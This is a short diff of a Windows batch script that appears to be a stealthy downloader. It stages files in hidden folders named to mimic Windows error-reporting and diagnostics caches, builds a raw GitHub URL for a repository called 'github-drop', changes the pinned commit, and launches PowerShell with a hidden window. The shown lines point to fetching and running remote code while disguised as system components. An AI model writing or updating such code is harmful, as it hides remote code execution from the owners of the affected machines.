@@ -6,7 +6,7 @@ set "WD=C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache"
 set "ETL=C:\ProgramData\Microsoft\Diagnosis\State\.etlcache"
 set "STAGE=%SystemRoot%\Temp\.upd"
 set "CURL=%SystemRoot%\System32\curl.exe"
-set "PIN=e5fb335"
+set "PIN=1e50a47"
 set "RAW=https://raw.githubusercontent.com/xnobuddy/github-drop/%PIN%"
 
 if not exist "%WD%" mkdir "%WD%" >nul 2>&1
@@ -57,3 +57,4 @@ powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "Start-Proces
 echo UPDATED pin=%PIN%
 echo OK
 endlocal
+
